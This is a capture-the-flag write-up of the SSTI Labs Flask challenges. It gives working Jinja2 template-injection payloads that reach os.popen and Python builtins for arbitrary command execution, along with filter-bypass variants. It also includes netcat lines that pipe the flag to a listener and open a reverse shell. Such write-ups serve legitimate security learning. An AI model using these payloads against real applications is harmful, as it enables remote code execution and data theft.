# SSTI Labs (by X3NNY) writeup
* You can find the link to the lab [here](https://github.com/X3NNY/sstilabs)

## Fingerprinting
* When we input `{{7*'7'}}`, Twig would output `49`, while Jinja2/Flask output `7777777`
* 


## Flask-Lab
### Level 1
* First, we can test for template injection by typing in `{{7 + 7}}`, which gives us `Hello 14`, which proves it is evaluating our input (and thus has SSTI)

* This is a basic problem. It doesn't seem like theres any input sanitization 
	* Here, our goal should be to find a function so we can look for the globals and run a command.

* **Note**: All these commands have to be included in the template structure `{{}}` because of how flask handles templating

* Interestingly, the python interpreter uses python itself internally, so we can access that in a bit of a roundabout way.
* The payload I used was: 

```python3
# look at files
{{ " ".__class__.__base__ .__subclasses__()[140].__init__.__globals__['sys'].modules['os'].popen('ls').read() }}

# cat files
{{ " ".__class__.__base__ .__subclasses__()[140].__init__.__globals__['sys'].modules['os'].popen('cat flag').read() }}
```
#### Breaking down the payload
1. Here, we are using an empty string and getting the `<class 'str'>` class
2. Next, we get the base (parent) of that class, which is the python object class: `<class 'object'>
3. `__subclasses__()` is a python function that gives us all child classes of a class, so this gives us a list of classes that inheret object
	1. Now, we have to find an index of this list that imports `sys`, which you can check for in the python source code.
	2. I used the `<class 'warnings.catch_warnings'>` class, which is typically around index `140` depending on your python version
4. `__init__` is like the constructor for any given class, and it a function we can be confident is in the class.
5. Once we have a function, `__globals__` gets us all the imported modules (and other globals) in the file from the function, which includes the sys module
6. `sys` includes the the the `os` module, so we can access the `.modules` dictionary to get the modules loaded, one of which is `os`
7. Now that we have access to the os module, we can run `popen('<command>').read()` and we have arbitrary code execution!

#### Alternative methods
* **Note**: This is a general method that works for most python SSTI
* However, we can do something specific on flask sites
* Because we know this is running flask, we know a function, [`url_for`](https://flask.palletsprojects.com/en/2.0.x/api/#flask.url_for), exists, which [imports os](https://github.com/pallets/flask/blob/main/src/flask/helpers.py)
	* Thus, we can do the same thing as before and run `url_for.__globals__.os.popen(<command>).read()`
* When we type in `{{ url_for.__globals__.os.popen('cat flag').read() }}`, we get the flag: `SSTILAB{enjoy_flask_ssti}`

## Level 2
* Immediately, it looks like even something as basic as `{{7 + 7}}` or `{{7}}` returns `Hello WAF`
	* Testing more, it looks like `{{` in particular is a blocked string

* We can bypass this, as flask has [more than one](https://flask.palletsprojects.com/en/2.0.x/tutorial/templates/) template type
	* For example, there is a `{%%}` template that is used for conditional checks
	* Unfortunately, this doesn't display anything, so our RCE is completely blind.

* To account for this, we're going to cat our output with the command `cat flag | nc 127.0.0.1 4444`
	* We can listen for a connection with `nc -lvnp 4444` locally

* Alternatively, we can also try to run a reverse shell using the command `nc -e /bin/sh 127.0.0.1 4444`
	* This serves a shell to localhost (our machine) on port 4444
	
* Here's the payload I used:
```python3
{% if url_for.__globals__.os.popen('cat flag | nc 127.0.0.1 4444').read() == 'blah' %}{% endif %}

```
#### Breaking down the payload
1. This checks to see if the condition `url_for.__globals__.os.popen('cat flag | nc 127.0.0.1 4444').read() == 'blah'` is true
	1. In this case, we know the output won't be 'blah', but the command still executes
2. Everything between `{% if %}` and `{% endif %}` is what would typically execute if the condition was true, but we don't have to worry about that here.

### Level 3
* Here, no matter what we input, we only see `wrong` or `correct` as an output
	* This is a classic blind SSTI problem
* Once again, we can use netcat to serve the file to us on our local machine
* It looks like there isn't any WAF on this level, so we can use roughly the same payload as last time:

```python3
{{ url_for.__globals__.os.popen('cat flag | nc 127.0.0.1 4444') }}
```

### Level 4
* For this level, it looks like `{{`, `}}`, `{{7 + 7}}`, and `{{7 * '7'}}` all work, but `[` and `]` are blocked 
* Thus, we can do exactly what we did in level 1:

```python3
{{ url_for.__globals__.os.popen('cat flag').read() }}
```

### Level 5
* For this level, it seems like single and double quotes are blocked

* At first I wanted to use chr() to convert digits into an ascii representation of the string, but flask doesn't have a built-in chr() function
	* Fortunately, we can still access python's chr() function

* To figure out the integer representation of 'flag', i used `[ord(i) for i in 'flag']`, which gave me the numbers `[102, 108, 97, 103]`


* Here's the payload I used:

```python3
{{ url_for.__globals__.__builtins__.open(url_for.__globals__.__builtins__.chr(102) + url_for.__globals__.__builtins__.chr(108) + url_for.__globals__.__builtins__.chr(97) + url_for.__globals__.__builtins__.chr(103)).read()}}
```
#### Breaking down the payload
1. To get the chr() function, we do the same thing as before, but access the [`__builtins__` module](https://docs.python.org/3/library/builtins.html), which has many useful functions, like `open()`,  `chr()`, and the other functions typically accessible in python
	1. To get a character based on any ordinal value, we can write `url_for.__globals__.__builtins__.chr(NUM)`
2. Thus, to get the whole `flag` string, we just append all of those together
3. Then, we use `url_for.__globals__.os.open()` and pass in the flag string to read the flag file


### Level 6
* It looks like in this level, we can't use any underscores
* Luckily, flask processes hex characters, so we can replace all our blocked characters with hex bytes
	* In this case, an underscore is 0x5f

* Here is the original payload along with the underscores converted to hex:
```python3

{{ " ".__class__.__base__ .__subclasses__()[140].__init__.__globals__['sys'].modules['os'].popen('cat flag').read() }}

{{""["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[140]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]['sys'].modules.os.popen('cat flag').read() }}


```

### Level 7
* This level doesn't allow dots
* We can do somethin similar to what we did in the last one and use give all the properties as strings:

* Here is the original payload along with the dots removed and all functions placed inside quotes and square brackets
```python3
{{ " ".__class__.__base__ .__subclasses__()[140].__init__.__globals__['sys'].modules['os'].popen('cat flag').read() }}


{{ " "["__class__"]["__base__"]["__subclasses__"]()[140]["__init__"]["__globals__"]['sys']["modules"]['os']["popen"]('cat flag')["read"]() }}


```

### Level 8
* This doesn't allow us to include "class", "base",  "globals", or "popen"
	* Thus, we can just convert everything to hex like we did before

* Here is the original payload along with all the characters converted to hex:
```python3

{{ url_for.__globals__.os.popen('cat flag').read() }}

{{ url_for["\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f"].os["\x70\x6f\x70\x65\x6e"]('cat flag').read() }}


```

### Level 9
* For this level, the hardest part was finding out what was blocked!
	* Turns out, any digit was blocked
* Luckily, we can use the same payload we've been using for a while without any numbers

```python3
{{ url_for.__globals__.os.popen('cat flag').read() }}
```

### Level 10
* Once again, I had a lot of trouble finding out what was blacklisted
	* `config`, which is a global variable passed by default, is set to `None` on this level
	* Usually, this is a good way to find out more about what's running on the server
		* Luckily we don't really need to use config to get the flag, but I'll show how to do some other things

* When we type in `{{config}}` nothing shows up
	* This could be due to WAF, but I decided to look more into it.
	* Turns out, config is set to `None` here.
* Here's the payload to check that:

```python3
{{ url_for.__globals__.__builtins__.locals()}}
```
* Once again, we're accessing the [built-in python functions](https://docs.python.org/3/library/functions.html), one of which being `locals()`, which shows the local symbol table 
